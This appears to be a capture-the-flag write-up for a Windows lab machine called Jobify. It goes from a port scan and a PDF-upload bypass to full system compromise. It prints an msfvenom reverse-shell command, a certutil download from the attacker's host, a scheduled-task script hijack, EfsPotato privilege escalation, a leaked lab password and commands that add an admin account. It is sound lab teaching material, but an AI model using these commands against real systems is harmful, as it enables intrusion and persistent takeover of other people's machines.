# Windows Machine

## Machine Info





## Ports Scan

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.200.150.151 -Pn

Nmap scan report for 10.200.150.151
Host is up (0.042s latency).
Not shown: 65527 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
443/tcp   open  ssl/http      Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: PDF Upload Analyzer
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-14T09:44:01+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=Jobify
| Not valid before: 2025-04-21T16:11:54
|_Not valid after:  2025-10-21T16:11:54
| rdp-ntlm-info: 
|   Target_Name: JOBIFY
|   NetBIOS_Domain_Name: JOBIFY
|   NetBIOS_Computer_Name: JOBIFY
|   DNS_Domain_Name: Jobify
|   DNS_Computer_Name: Jobify
|   Product_Version: 10.0.17763
|_  System_Time: 2025-08-14T09:43:21+00:00
8081/tcp  open  http          Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: PDF Upload Analyzer
49665/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-14T09:43:24
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
```



## Initial Access

### File Upload Bypass

With nmap ports scan an attacker can view that there is a HTTP server on 8081 port.

This page has a Form where a user can upload his CV only in pdf format. An attacker can try to bypass the restriction extention format to upload a executable file that will establish a reverse shell.

Using msfvenom tool an attacker can craft a executable reverse shell payload:&#x20;

{% code overflow="wrap" %}
```
msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=10.250.1.6 LPORT=9009 -f exe -o cv.exe
```
{% endcode %}

An attacker can upload this file intercepting the request with Burp Suite, and add the .pdf extention at the end of the `filename` parameter, making the file name `cv.exe.pdf` . In this way an attacker can make a MIME-type bypass method to upload a reverse shell into the site.

Doing a directory enumeration an attacker can retrive the directory where the cvs will be store.

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.200.150.151:8081/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
```
{% endcode %}

The directory that contains the cvs is the /uploads directory accessible from the webpage. An attacker can open the payload and the reverse shell will establish.

The attacker has obtained the initial access as user `jobify\hr`.

### User flag

```
more C:\user.txt
THM{ab94ee51-8866-407d-b7fd-82235e94c787}
```



## Privilege Escalation

Looking around the machine as hr account, an attacker can found the plain-text credentials in the file `C:\Users\hr\Desktop\notes.txt` that contains this message:

```
Hey,

Just a heads-up before I forget � the creds for the HR account are still the default. Not ideal, I know, but I haven�t had time to rotate them yet. ??

Account: hr  
Password: TryH@cKMe9#21TryH@cKMe9#21
```

An attacker with hr access can view all Scheduled tasks of the machine with this commands:

```
schtasks /query /fo LIST /v
```

And he can find this vulnerable Scheduled Task:

<pre><code>Folder: \
HostName:                             JOBIFY
TaskName:                             \Monitor
Next Run Time:                        N/A
Status:                               Running
Logon Mode:                           Interactive/Background
Last Run Time:                        8/14/2025 1:00:33 PM
Last Result:                          267009
Author:                               JOBIFY\Administrator
Task To Run:                          powershell.exe -ExecutionPolicy Bypass -File C:\Users\hr\Documents\Task\file.ps1
Start In:                             N/A
Comment:                              N/A
Scheduled Task State:                 Enabled
Idle Time:                            Disabled
Power Management:                     Stop On Battery Mode, No Start On Batteries
<strong>Run As User:                          hr
</strong>Delete Task If Not Rescheduled:       Disabled
Stop Task If Runs X Hours and X Mins: 72:00:00
Schedule:                             Scheduling data is not available in this format.
Schedule Type:                        At system start up
Start Time:                           N/A
Start Date:                           N/A
End Date:                             N/A
Days:                                 N/A
Months:                               N/A
Repeat: Every:                        N/A
Repeat: Until: Time:                  N/A
Repeat: Until: Duration:              N/A
Repeat: Stop If Still Running:        N/A
</code></pre>

This task executes a ps1 file as Administrator in the hr's Documents.

An attacker can check the file's rights using this command:

```
icacls file.ps1
file.ps1 NT AUTHORITY\SYSTEM:(F)
         BUILTIN\Administrators:(F)
         JOBIFY\Administrator:(F)
         NT AUTHORITY\SYSTEM:(I)(F)
         BUILTIN\Administrators:(I)(F)
         JOBIFY\hr:(I)(F)
```

The hr's account has Full rights to this file. An attacker can change this file with a ps1 reverse shell and obtain a shell as Administrator.

Once that an attacker changes the file.ps1 with a reverse shell payload can use this command to restart the Scheduled Task

```
schtasks /run /tn Monitor
```





```
certutil -urlcache -f http://10.250.1.6/winPEAS.ps1 winPEAS.ps1
```



```
C:\Users\hr\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt


```



***

An attacker with access to the web server machine could upload a webshell into the `C:\xampp\htdocs\uploads` direectory.

The Windows service has by default the SeImpersonatePrivilege privilege, that can be used by an attacker to escalate privilege and comprimise the machine.

To verify this an attacker has to execute this command to the Webshell uploaded:

```
whoami /all
```

In this case the service has the SeImpersonatePrivilege privilege and an attacker can perform a privilege escalation.

There are many technique to exploit SeImpersonatePrivilege right, a common is used the EfsPotato executable. This file has need to be compile into the target machine and then when the .exe file an attacker can execute command as `nt autority\system` .

This command is used from an attacker to compile the .cs file transfered to local machine.

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

And this command is used from an attacker to execute command as nt autority\system, in this case the command make a reverse shell as privileged user.

{% code overflow="wrap" %}
```
EfsPotato.exe "powershell -e PAYLOAD_REDACTED"
```
{% endcode %}

With this privilege an attacker can add a new user and add it to the Administrators group.

With this new account created an attacker takes parsistance into target machine as administrator.

```bash
net user Administrator2 Password123! /add
net localgroup Administrators Administrator /add
```



### Root flag

```bash
more root.txt
THM{07b4be27-2112-468d-87d8-6b8e9e372eb5}
```
